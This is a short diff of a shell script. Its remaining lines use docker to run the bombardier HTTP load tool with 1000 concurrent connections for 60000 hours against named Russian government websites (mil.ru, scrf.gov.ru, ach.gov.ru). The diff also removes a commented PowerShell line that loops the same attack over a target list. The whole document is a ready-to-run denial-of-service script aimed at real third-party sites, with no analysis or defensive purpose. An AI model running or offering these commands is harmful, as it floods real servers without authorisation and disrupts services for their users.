@@ -1,4 +1,3 @@
-#powershell.exe -Command "Get-Content resources.txt"|ForEach-Object {docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $_ }
 docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://mil.ru
 docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://www.scrf.gov.ru
 docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://ach.gov.ru
